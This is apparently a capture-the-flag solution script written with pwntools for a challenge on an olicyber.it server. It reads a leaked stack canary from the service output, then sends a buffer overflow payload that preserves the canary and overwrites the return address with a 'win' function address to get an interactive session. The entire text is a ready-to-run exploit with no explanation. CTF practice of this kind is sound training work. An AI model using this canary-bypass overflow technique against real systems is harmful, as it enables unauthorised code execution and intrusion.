from pwn import *

WIN = p64(0x00401715)

io = remote("bigbird.challs.olicyber.it", 12006)

CANARY = p64(int(io.readuntil(b"Listen").split()[-2][2:], 16))

io.sendline(b"a" * 40 + CANARY + b"a" * 8 + WIN)
io.interactive()
